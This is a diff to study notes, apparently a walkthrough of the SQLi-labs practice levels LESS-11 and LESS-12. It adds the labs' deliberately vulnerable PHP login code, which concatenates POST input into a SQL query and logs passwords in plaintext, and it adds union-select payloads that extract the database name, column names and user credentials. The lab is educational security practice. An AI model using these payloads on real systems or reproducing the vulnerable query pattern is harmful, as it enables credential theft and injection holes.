@@ -251,6 +251,21 @@ sql_bool()
 ```
 
 ## LESS-11
+```php
+$uname=$_POST['uname'];  
+$passwd=$_POST['passwd'];  
+  
+//logging the connection parameters to a file for analysis.  
+$fp=fopen('result.txt','a');  
+fwrite($fp,'User Name:'.$uname);  
+fwrite($fp,'Password:'.$passwd."\n");  
+fclose($fp);  
+  
+  
+// connectivity @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";  
+$result=mysql_query($sql);  
+$row = mysql_fetch_array($result);
+```
 爆字段数
 ![](attachment/Pasted%20image%2020230225152558.png)
 data : uname=1' union select 1,database() --+&passwd=1
@@ -265,4 +280,25 @@ data： uname=1' union select 1,group_concat(column_name) from information_schem
 
 data: uname=1' union select 1,group_concat(concat(username,'~',password)) from users --+&passwd=1
 ![](attachment/Pasted%20image%2020230225153356.png)
+
+## LESS-12
+```php
+$uname=$_POST['uname'];  
+$passwd=$_POST['passwd'];  
+  
+//logging the connection parameters to a file for analysis.  
+$fp=fopen('result.txt','a');  
+fwrite($fp,'User Name:'.$uname."\n");  
+fwrite($fp,'Password:'.$passwd."\n");  
+fclose($fp);  
+  
+  
+// connectivity  
+$uname='"'.$uname.'"';  
+$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";  
+$result=mysql_query($sql);  
+$row = mysql_fetch_array($result);
+```
+闭合方式变为`")`
+data: uname=1") union select 1,group_concat(concat(username,password)) from users --+&passwd=1
 
